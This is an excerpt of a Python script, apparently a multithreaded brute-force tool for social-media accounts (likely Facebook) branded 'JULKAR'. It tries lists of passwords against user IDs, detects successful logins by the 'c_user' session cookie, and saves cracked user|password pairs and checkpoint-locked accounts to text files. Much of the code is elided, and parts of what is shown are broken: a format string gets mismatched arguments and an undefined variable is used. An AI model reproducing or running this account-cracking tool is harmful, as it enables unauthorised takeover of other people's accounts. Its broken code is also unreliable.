...
from concurrent.futures import ThreadPoolExecutor as julkarnayen
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mJULKAR_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mJULKAR_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back JULKAR Menu ")
	    julkar()
...
def julkar():
    ...
    if _julkar___ in ('1', '01'):
        __xxx__().julkarx(id)
    if _julkar___ in ('2', '02'):
        create_file()
    if _julkar___ in ('E', 'ee'):
        pass
...
class __xxx__:
        ...
        try:
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [JULKAR-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('JULKAR_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [JULKAR-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('JULKAR_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with julkarnayen(max_workers=30) as aliworld:
